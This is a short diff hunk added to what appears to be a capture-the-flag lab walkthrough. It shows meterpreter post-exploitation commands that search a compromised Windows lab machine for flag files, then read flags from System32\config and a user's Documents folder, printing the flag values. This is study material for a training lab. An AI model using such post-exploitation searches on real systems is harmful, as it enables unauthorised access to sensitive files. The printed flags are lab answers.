@@ -425,3 +425,25 @@ cd ..
 C:\>type flag1.txt
 type flag1.txt
 flag{access_the_machine}
+
+# background -> Background channel 2? [y/N] y
+
+# meterpreter > search -f flag\*.txt
+
+# Found 3 results...
+
+Path Size (bytes) Modified (UTC)
+
+---
+
+c:\Users\Jon\Documents\flag3.txt 37 2019-03-17 19:26:36 +0000
+c:\Windows\System32\config\flag2.txt 34 2019-03-17 19:32:48 +0000
+c:\flag1.txt 24 2019-03-17 19:27:21 +0000
+
+# C:\Windows\System32\config>type flag2.txt
+
+type flag2.txt
+flag{sam_database_elevated_access}
+
+type c:\Users\Jon\Documents\flag3.txt
+flag{admin_documents_can_be_valuable}
